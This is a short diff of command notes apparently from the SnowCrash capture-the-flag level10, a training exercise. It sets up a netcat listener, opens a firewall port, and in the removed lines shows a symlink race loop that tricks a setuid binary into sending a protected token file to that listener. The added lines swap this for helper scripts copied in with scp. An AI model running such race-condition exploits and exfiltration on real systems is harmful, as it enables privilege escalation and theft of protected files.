@@ -1,12 +1,14 @@
 nm level10
 man access
 netstat -rn
-chmod 777 .
-touch fake
+# ln -s fake link
+scp -P 4242 level10/Ressources/script-* level10@snowcrash:~/
 #host
+ip address show
 #open 6969 port
-sudo iptables -A INPUT -p tcp --dport 6969 -j ACCEPT
-sudo systemctl restart iptables
+#sudo iptables -A INPUT -p tcp --dport 6969 -j ACCEPT
+#sudo systemctl restart iptables
 while true; do nc -l 6969; done
-#snowcrash
-while true; do ln -fs fake link; ln -fs token link; done & while true; do ./level10 link 192.168.1.0; done
+#snowcrash (screen -S)
+./script-link
+./script-send
